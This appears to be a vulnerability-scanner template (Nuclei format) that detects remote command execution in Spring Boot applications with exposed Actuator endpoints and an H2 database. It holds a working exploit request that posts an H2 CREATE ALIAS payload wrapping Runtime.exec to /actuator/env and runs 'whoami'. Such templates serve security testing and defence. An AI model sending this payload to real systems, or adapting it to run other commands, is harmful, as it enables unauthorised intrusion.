id: springboot-h2-db-rce
info:
  name: Spring Boot H2 Database - Remote Command Execution
  author: dwisiswant0
  severity: critical
  description: Spring Boot H2 database allows attackers to execute remote commands.
  reference:
  - https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
  - https://twitter.com/pyn3rd/status/1305151887964946432
  - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
  - https://github.com/spaceraccoon/spring-boot-actuator-h2-rce
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  metadata:
    shodan-query: http.favicon.hash:116323821
    impact: The vulnerability springboot-h2-db-rce has an impact on the security of
      Spring Boot H2 Database as it allows for remote command execution.
    recommendation: I recommend promptly updating Spring Boot H2 Database to eliminate
      the vulnerability of remote code execution.
  tags: springboot,rce,jolokia
requests:
- raw:
  - "POST /actuator/env HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\
    \n{\n  \"name\":\"spring.datasource.hikari.connection-test-query\",\n  \"value\"\
    :\"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException\
    \ { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());\
    \ if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL\
    \ EXEC('whoami');\"\n}\n"
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - '"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT'
